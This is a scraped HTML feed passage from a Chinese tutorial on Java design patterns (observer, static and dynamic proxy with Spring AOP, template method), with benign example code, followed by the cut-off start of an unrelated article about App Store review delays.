    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(StockObserver observer)</span>; 
    <span class="hljs-comment">// 移除观察者</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(StockObserver observer)</span>; 
    <span class="hljs-comment">// 通知所有注册的观察者</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObservers</span><span class="hljs-params">()</span>; 
}

<span class="hljs-comment">// 具体主题：股票 (Stock)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StockSubject</span> {
    <span class="hljs-keyword">private</span> List&lt;StockObserver&gt; observers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    privatedouble price;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(StockObserver observer)</span> {
        <span class="hljs-comment">// 将观察者添加到观察者列表</span>
        observers.add(observer); 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(StockObserver observer)</span> {
        <span class="hljs-comment">// 从观察者列表中移除观察者</span>
        observers.remove(observer); 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObservers</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 遍历观察者列表，调用每个观察者的 update 方法进行通知</span>
        <span class="hljs-keyword">for</span> (StockObserver observer : observers) {
            observer.update(price);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-comment">// 设置新的股价并通知观察者</span>
        <span class="hljs-built_in">this</span>.price = price; 
        notifyObservers();
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass ObserverPatternExample {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stock</span>();

        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Alice"</span>);
        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Bob"</span>);
        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Charlie"</span>);

        <span class="hljs-comment">// 注册投资者为观察者</span>
        stock.registerObserver(investor1);
        stock.registerObserver(investor2);
        stock.registerObserver(investor3);

        <span class="hljs-comment">// 更新股价，观察者将收到通知</span>
        stock.setPrice(<span class="hljs-number">100.0</span>); 
        stock.setPrice(<span class="hljs-number">105.0</span>);

        <span class="hljs-comment">// 移除一个观察者</span>
        stock.removeObserver(investor2); 

        <span class="hljs-comment">// 再次更新股价，剩余的观察者将收到通知</span>
        stock.setPrice(<span class="hljs-number">110.0</span>); 
    }
}
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-sql" lang="sql">Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Bob received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Bob received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">110.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">110.0</span>
</code></pre>
<p><strong>代码解释：</strong></p>
<ol>
<li>首先，创建一个 <code>Stock</code>对象作为主题。</li>
<li>创建多个 <code>Investor</code>对象作为观察者。</li>
<li>使用 <code>registerObserver</code>方法将这些投资者注册到 <code>Stock</code>对象。</li>
<li>当调用 <code>setPrice</code>方法更新股价时，所有注册的投资者会自动收到通知。</li>
<li>你可以使用 <code>removeObserver</code>方法移除不需要接收通知的投资者。</li>
</ol>
<h3 data-id="heading-22">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Observer</code>和 <code>java.util.Observable</code></li>
<li><code>javax.swing.event.ChangeListener</code></li>
</ul>
<h3 data-id="heading-23">Spring 中的应用：</h3>
<ul>
<li><code>ApplicationEvent</code>和 <code>ApplicationListener</code>是典型的实现。</li>
</ul>
<h2 data-id="heading-24">6. 代理模式</h2>
<p>代理模式通过一个代理对象控制对目标对象的访问，常用于访问控制和日志记录等场景。此外，代理模式还包括静态代理和动态代理。</p>
<h3 data-id="heading-25">代码实现：静态代理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义服务接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>();
}

<span class="hljs-comment">// 实现服务接口的真实服务类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RealService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"RealService is executing..."</span>);
    }
}

<span class="hljs-comment">// 代理服务类，持有真实服务对象的引用</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Service</span> realService;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ServiceProxy</span>() {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">realService</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RealService</span>();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations before calling the real service, such as logging or permission checking"</span>);
        realService.<span class="hljs-title function_">execute</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations after calling the real service, such as performance statistics"</span>);
    }
}


<span class="hljs-comment">// 测试静态代理</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticProxyExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">Service</span> service = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceProxy</span>();
        <span class="hljs-comment">// 通过代理调用 execute 方法</span>
        service.<span class="hljs-title function_">execute</span>();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>Service</code>接口：定义了服务的抽象方法 <code>execute</code>。</li>
<li><code>RealService</code>类：它是实现 <code>Service</code>接口的具体类，提供了服务的具体实现。</li>
<li><code>ServiceProxy</code>类：它是 <code>RealService</code>的代理类，也实现了 <code>Service</code>接口。在 <code>execute</code>方法中，除了调用真实服务的 <code>execute</code>方法外，还添加了前后额外的操作，实现了代理功能。</li>
<li>在 <code>StaticProxyExample</code>的 <code>main</code>方法中，创建一个 <code>ServiceProxy</code>对象并调用 <code>execute</code>方法，实现了对 <code>RealService</code>的代理调用。</li>
</ul>
<h3 data-id="heading-26">代码实现：动态代理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">InvocationHandler</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Method</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Proxy</span>;

<span class="hljs-comment">// 定义服务接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DynamicService</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">performTask</span>();
}

<span class="hljs-comment">// 实现服务接口的真实服务类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RealDynamicService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DynamicService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">performTask</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"RealDynamicService is performing a task..."</span>);
    }
}

<span class="hljs-comment">// 动态代理调用处理器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> target;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span>(<span class="hljs-title class_">Object</span> target) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">target</span> = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-title class_">Object</span> proxy, <span class="hljs-title class_">Method</span> method, <span class="hljs-title class_">Object</span>[] args) throws <span class="hljs-title class_">Throwable</span> {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations before calling the real service, such as logging or permission checking."</span>);
        <span class="hljs-title class_">Object</span> result = method.<span class="hljs-title function_">invoke</span>(target, args);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations after calling the real service, such as performance statistics."</span>);
        <span class="hljs-keyword">return</span> result;
    }
}


<span class="hljs-comment">// 测试动态代理</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicProxyExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">RealDynamicService</span> realService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RealDynamicService</span>();
        <span class="hljs-comment">// 创建调用处理器并传入真实服务对象</span>
        <span class="hljs-title class_">DynamicServiceInvocationHandler</span> handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span>(realService);
        <span class="hljs-comment">// 创建动态代理对象</span>
        <span class="hljs-title class_">DynamicService</span> proxyService = (<span class="hljs-title class_">DynamicService</span>) <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">newProxyInstance</span>(
                <span class="hljs-title class_">DynamicService</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">getClassLoader</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]{<span class="hljs-title class_">DynamicService</span>.<span class="hljs-property">class</span>},
                handler);
        <span class="hljs-comment">// 通过代理调用 performTask 方法</span>
        proxyService.<span class="hljs-title function_">performTask</span>();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>DynamicService</code>接口：定义了服务的抽象方法 <code>performTask</code>。</li>
<li><code>RealDynamicService</code>类：它是实现 <code>DynamicService</code>接口的具体类，提供了服务的具体实现。</li>
<li><code>DynamicServiceInvocationHandler</code>类：实现了 <code>InvocationHandler</code>接口，当代理对象的方法被调用时，其 <code>invoke</code>方法会被触发。在 <code>invoke</code>方法中，在调用真实服务方法前后添加了额外操作。</li>
<li>在 <code>DynamicProxyExample</code>的 <code>main</code>方法中，首先创建 <code>RealDynamicService</code>的实例，然后创建 <code>DynamicServiceInvocationHandler</code>实例并传入真实服务对象。接着使用 <code>Proxy.newProxyInstance</code>方法创建 <code>DynamicService</code>的代理对象，并调用 <code>performTask</code>方法，从而实现动态代理。</li>
</ul>
<h3 data-id="heading-27">真实源码中的应用</h3>
<p>在 Spring 框架中，AOP（面向切面编程）是代理模式的典型应用。Spring AOP 主要使用动态代理实现。当你使用 <code>@Aspect</code>注解定义一个切面，并使用 <code>@Before</code>、<code>@After</code>、<code>@Around</code>等注解定义通知时，Spring 会为受切面影响的 Bean 创建代理对象。</p>
<p>例如，你可能有一个服务类如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Service</span>;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addUser</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Adding user: "</span> + username);
    }
}
</code></pre>
<p>你可以定义一个切面类如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.aspectj.lang.<span class="hljs-keyword">annotation</span>.Aspect;
<span class="hljs-keyword">import</span> org.aspectj.lang.<span class="hljs-keyword">annotation</span>.Before;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceAspect</span> {
    <span class="hljs-meta">@Before(<span class="hljs-string">"execution(* com.example.service.UserService.addUser(..))"</span>)</span>
    <span class="hljs-keyword">public</span> void beforeAddUser() {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Before adding user..."</span>);
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>UserService</code>是一个普通的服务类，包含 <code>addUser</code>方法。</li>
<li><code>UserServiceAspect</code>是一个切面类，使用 <code>@Before</code>注解定义了一个前置通知。当 <code>UserService</code>的 <code>addUser</code>方法被调用时，Spring 会为 <code>UserService</code>创建一个代理对象，并在调用 <code>addUser</code>方法之前执行 <code>beforeAddUser</code>方法。</li>
</ul>
<p>Spring 使用动态代理机制（如果是接口则使用 JDK 动态代理，否则使用 CGLIB 动态代理），在不修改 <code>UserService</code>类代码的情况下，将切面逻辑织入到 <code>UserService</code>的方法调用中，从而实现了横切关注点的分离。</p>
<h3 data-id="heading-28">总结</h3>
<ul>
<li>静态代理在编译时确定代理类和被代理类的关系，代码简单易懂，但如果接口方法较多，为每个方法添加代理逻辑会很繁琐。</li>
<li>动态代理通过反射机制在运行时生成代理对象，更加灵活，可以动态添加代理逻辑。适用于需要为多个不同的类或方法添加相同或相似代理逻辑的场景，如日志记录、性能统计、权限检查等。</li>
<li>Spring AOP 是动态代理在实际框架中的应用，它帮助开发者更好地实现面向切面编程，将横切关注点（如日志、事务、安全等）与业务逻辑分离，提高了代码的可维护性和可扩展性。</li>
</ul>
<h2 data-id="heading-29">7. 模板方法模式</h2>
<p>模板方法模式定义了一个算法的骨架，并将具体实现留给子类。</p>
<h3 data-id="heading-30">代码实现：制作饮料</h3>
<p>模拟制作咖啡和茶的过程。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BeverageMaker</span> {
    <span class="hljs-comment">// 模板方法，定义制作饮料的算法骨架</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-keyword">void</span> <span class="hljs-title">makeBeverage</span>()</span> {
        prepareIngredients();
        brew();
        pourInCup();
        addCondiments();
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span>;

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span>;

    <span class="hljs-comment">// 将饮料倒入杯中，有具体实现，可以被重写</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pourInCup</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Pour the beverage into a cup"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span>;
}

<span class="hljs-comment">// 具体子类 CoffeeMaker，用于制作咖啡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">CoffeeMaker</span> <span class="hljs-title">extends</span> <span class="hljs-title">BeverageMaker</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Prepare coffee beans and water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Brew coffee with a coffee machine"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Add sugar and milk"</span>);
    }
}

<span class="hljs-comment">// 具体子类 TeaMaker，用于制作茶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">TeaMaker</span> <span class="hljs-title">extends</span> <span class="hljs-title">BeverageMaker</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Prepare tea leaves and hot water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Brew tea with hot water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Add lemon slices"</span>);
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass TemplateMethodPatternDemo {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        BeverageMaker coffeeMaker = <span class="hljs-keyword">new</span> CoffeeMaker();
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Making coffee:"</span>);
        coffeeMaker.makeBeverage();

        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"\n-----------------"</span>);

        BeverageMaker teaMaker = <span class="hljs-keyword">new</span> TeaMaker();
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Making tea:"</span>);
        teaMaker.makeBeverage();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>BeverageMaker</code>是一个抽象类，其中 <code>makeBeverage</code>是一个模板方法。它定义了制作饮料的算法骨架，即先准备原料，然后冲泡，接着将饮料倒入杯中，最后添加调料。该方法是 <code>final</code>的，不允许子类修改这个流程的顺序。</li>
<li><code>prepareIngredients</code>、<code>brew</code>和 <code>addCondiments</code>是抽象方法。因为不同的饮料准备原料、冲泡和添加调料的方式不同，所以这些方法由具体的子类来实现。</li>
<li><code>pourInCup</code>方法是一个有默认实现的方法。对于大多数饮料来说，将饮料倒入杯中的操作是相似的，但如果子类有特殊需求，也可以重写该方法。</li>
<li><code>CoffeeMaker</code>和 <code>TeaMaker</code>是 <code>BeverageMaker</code>的具体子类。它们分别重写了 <code>prepareIngredients</code>、<code>brew</code>和 <code>addCondiments</code>方法，实现了制作咖啡和茶的具体步骤。</li>
<li>在 <code>TemplateMethodPatternDemo</code>的 <code>main</code>方法中，我们创建了 <code>CoffeeMaker</code>和 <code>TeaMaker</code>的实例，并调用它们的 <code>makeBeverage</code>方法。这样，我们可以看到，在不改变整体制作流程的情况下，不同的饮料可以按照自己的特点完成各个步骤。</li>
</ul>
<p>这个例子更贴近实际生活。它通过制作饮料的过程展示了模板方法模式如何分离算法的框架和具体实现，提高了代码的复用性和可维护性。对于不同的饮料，我们只需要关注它们各自的特点，而不需要重复实现整个制作流程，体现了模板方法模式的优势。</p>
<p>通过使用模板方法模式，我们可以在保证流程一致性的同时，根据具体情况灵活定制不同的步骤，使得代码更加清晰、易于扩展和维护。</p>
<h3 data-id="heading-31">JDK 中的应用：</h3>
<ul>
<li><code>java.util.AbstractList</code>和 <code>java.util.AbstractMap</code></li>
</ul>
<h3 data-id="heading-32">Spring 中的应用：</h3>
<ul>
<li><code>JdbcTemplate</code>和 <code>RestTemplate</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[最近一周AppStore卡审严重么？]]></title>    <link>https://juejin.cn/post/7602303923169902601</link>    <guid>https://juejin.cn/post/7602303923169902601</guid>    <pubDate>2026-02-03T05:55:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923169902601" data-draft-id="7602176198874824747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="最近一周AppStore卡审严重么？"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2026-02-03T05:55:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS研究院"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            最近一周AppStore卡审严重么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS研究院
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:55:25.000Z" title="Tue Feb 03 2026 05:55:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 